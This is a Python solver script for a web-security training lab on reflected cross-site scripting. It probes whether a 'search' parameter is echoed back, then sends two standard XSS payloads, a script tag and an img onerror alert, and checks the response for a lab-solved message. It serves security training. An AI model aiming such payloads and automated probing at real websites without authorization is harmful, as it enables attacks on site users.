from utils.requester import Requester
from utils.logger import get_logger

logger = get_logger(__name__)

class XSSReflectedSolver:
    """
    Reflected XSS into HTML context with nothing encoded
    """
    
    def __init__(self, lab_url):
        self.lab_url = lab_url.rstrip('/')
        self.requester = Requester()
        
    def solve(self):
        logger.info(f"[+] Solving XSS lab: {self.lab_url}")
        
        vulnerable_param = self._find_vulnerable_param()
        if not vulnerable_param:
            logger.error("[-] No vulnerable parameter found")
            return False
        
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        for payload in payloads:
            logger.info(f"[*] Trying payload: {payload[:50]}")
            if self._exploit(vulnerable_param, payload):
                logger.info(f"[+] Success with payload: {payload}")
                return True
        
        logger.warning("[-] XSS lab not solved")
        return False
    
    def _find_vulnerable_param(self):
        logger.info("[*] Looking for vulnerable parameter...")
        
        test_payload = "XSS_TEST_123"
        response = self.requester.get(self.lab_url, params={"search": test_payload})
        
        if response and test_payload in response.text:
            logger.info("[+] Found parameter: search")
            return "search"
        
        return None
    
    def _exploit(self, param, payload):
        response = self.requester.get(self.lab_url, params={param: payload})
        
        if response and ("Lab solved" in response.text or "Congratulations" in response.text):
            return True
            
        return False
